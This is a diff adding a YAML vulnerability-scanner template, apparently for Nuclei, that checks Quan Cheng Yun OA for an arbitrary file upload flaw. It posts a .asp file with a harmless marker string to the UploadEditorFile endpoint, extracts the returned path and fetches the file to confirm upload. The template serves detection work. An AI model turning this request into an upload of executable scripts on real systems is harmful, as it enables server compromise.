@@ -1,0 +1,59 @@
+id: poc-yaml-quan-cheng-yun-uploadeditorfile-anyfile-upload
+
+info:
+  name: Quan Cheng Yun OA UploadEditorFile Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in the UploadEditorFile interface of Quan Cheng Yun OA.
+
+variables:
+  t1: "{{rand_text_alphanumeric(8)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/OA/api/2.0/Common/AttachFile/UploadEditorFile"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryNe8DcVuv1vEUWDaR"
+    body: |-
+      ------WebKitFormBoundaryNe8DcVuv1vEUWDaR
+      Content-Disposition: form-data; name="upload"; filename="1.asp"
+
+      This website has a vulnerability{{t1}}
+      ------WebKitFormBoundaryNe8DcVuv1vEUWDaR--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"filePath":'
+    extractors:
+      - type: regex
+        name: filepath
+        internal: true
+        group: 1
+        regex:
+          - '"filePath":"(.*?).asp"'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{filepath}}.asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "This website has a vulnerability"
+          - "{{t1}}"
